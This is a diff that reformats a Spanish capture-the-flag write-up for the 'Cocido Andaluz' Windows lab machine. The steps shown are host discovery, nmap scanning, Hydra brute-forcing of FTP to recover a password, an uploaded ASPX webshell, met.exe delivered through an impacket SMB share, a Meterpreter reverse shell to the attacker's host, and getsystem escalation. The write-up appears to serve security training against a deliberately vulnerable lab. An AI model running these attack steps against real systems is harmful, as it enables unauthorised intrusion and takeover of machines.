@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Cocido Andaluz 
+---
+icon: windows
+---
 
-**Plataforma:** The Hackers Labs  
-**Sistema Operativo:** Windows  
+# Cocido Andaluz ​​
+
+## 🖥️ Writeup - Cocido Andaluz
+
+**Plataforma:** The Hackers Labs\
+**Sistema Operativo:** Windows
 
 > **Tags:** `Windows` `FTP` `Hydra` `File Upload` `ASPX Webshell` `RCE` `Metasploit` `Impacket` `SMB Delivery`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el archivo `zip` que contiene la `.ova` de la máquina Cocido Andaluz, lo extraemos y la importamos en VirtualBox.
 
 Configuramos la interfaz de red de la máquina Cocido Andaluz y la iniciamos junto a nuestra máquina atacante.
 
-# RECONOCIMIENTO DE HOSTS
+## RECONOCIMIENTO DE HOSTS
 
 En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,23 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:67:2e:3e      1      60  PCS Systemtechnik GmbH      
  10.0.4.38       08:00:27:9a:e7:06      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 Identificamos con seguridad que la `IP` de la víctima es `10.0.4.38`.
 
-# ESCANEO DE PUERTOS    
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.38
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p21,80,139,445 --min-rate 5000 10.0.4.38
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-11 22:56 +0100
 Nmap scan report for 10.0.4.38
@@ -85,7 +94,7 @@ Realizamos `fuzzing` de directorios, pero no encontramos nada relevante.
 
 Intentamos acceder al servicio `FTP` (puerto 21) como `anonymous`, pero no está habilitado.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Procedemos a realizar un ataque de fuerza bruta contra el servicio `FTP` utilizando `Hydra`.
 
@@ -94,6 +103,7 @@ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -108,7 +118,7 @@ Encontramos credenciales válidas para el usuario `info` : `PolniyPizdec0211`.
 
 Accedemos por FTP.
 
-```bash 
+```bash
 ftp info@10.0.4.38
 ```
 
@@ -121,7 +131,7 @@ dr--r--r--   1 owner    group               0 Jun 14  2024 aspnet_client
 226 Transfer complete.
 ```
 
-# RCE
+## RCE
 
 Vamos a subir una `webshell ASPX` a través del `FTP` para poder inyectar comandos desde el navegador.
 
@@ -141,7 +151,7 @@ Una vez subida, accedemos a la `webshell` vía navegador.
 http://10.0.4.38/cmd.aspx
 ```
 
-![alt text](../../images/aspx.png)
+![alt text](../../.gitbook/assets/aspx.png)
 
 Como vemos en la captura, ya tenemos ejecución remota de comandos (`RCE`).
 
@@ -160,6 +170,7 @@ sudo impacket-smbserver share .
 ```
 
 Info:
+
 ```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -185,7 +196,8 @@ A continuación, desde la `webshell ASPX`, llamamos a `met.exe` utilizando la ru
 ```
 
 Info:
-``` 
+
+```
 [*] Started reverse TCP handler on 10.0.4.12:443 
 [*] Sending stage (188998 bytes) to 10.0.4.38
 [*] Meterpreter session 1 opened (10.0.4.12:443 -> 10.0.4.38:49209) at 2026-01-12 00:04:55 +0100
@@ -197,9 +209,9 @@ meterpreter >
 
 Obtenemos exitosamente la sesión de `Meterpreter`. Como vemos, aún no tenemos los máximos privilegios.
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
-Intentamos un `getsystem` y ¡funciona! 
+Intentamos un `getsystem` y ¡funciona!
 
 ```
 meterpreter > getsystem
